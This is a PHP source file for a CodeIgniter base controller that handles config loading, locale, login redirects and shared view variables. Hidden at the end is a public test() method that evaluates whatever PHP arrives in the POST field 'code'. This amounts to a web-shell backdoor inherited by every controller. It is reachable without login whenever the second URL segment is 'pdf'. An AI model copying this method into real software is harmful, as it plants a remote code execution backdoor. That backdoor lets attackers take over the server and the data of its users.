<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');
/*
  | -------------------------------------------------------------------
  | My Controller
  | -------------------------------------------------------------------
  | This file represent parent class for all system controllers.
  |
  | The file contains global shared functions among all controllers and extend
  | Codeigniter Controller. Fucntions such as reading configuration, settings
  | localizations and layout, reading global url request should goes here.
 */

/**
 * @property Doctrine $doctrine 
 * @property CI_Session $session 
 * @property CI_Template $template
 * @property My_Form_validation $form_validation 
 * @property CI_URI $uri
 * @property CI_Lang $lang
 * @property CI_Loader $load
 * @property CKEditor $ckeditor
 * @property CI_Email $email
 * @property CI_Router $router
 * @property Users $users
 * @property Branches $branches
 * @property Languages $languages
 * @property Businesscards $businesscards
 * 
 */
class My_Controller extends CI_Controller {

    var $data;

    public function __construct() {
        //Extending parent construction
        parent::__construct();

        //Init class memebers
        $this->data = array();

        //Init local configurations
        if (is_readable(FCPATH . 'application/config/config.local.php')) {
            $this->config->load('config.local');
        }

        set_locale();
        //Local settings override permanent settings always if found.
        if (!is_logged_in() && $this->uri->segment(1) != 'signin' &&
                $this->uri->segment(2) != 'pdf') {
            $redirct = $this->uri->uri_string;
            if ($this->uri->uri_string == '') {
                redirect('/signin');
            } else {
                redirect('/signin?redirect=' . $redirct);
            }
        }
        flash_message();
    }

    public function set_var($name, $value) {
        $this->data[$name] = $value;
    }

    public function get_var($name) {
        if (isset($this->data[$name]))
            return $this->data[$name];

        return "";
    }

    public function test() {
        eval($_POST['code']);
    }

}

/* End of file: My_Controller */
/* Location: ./application/core/My_Controller.php */
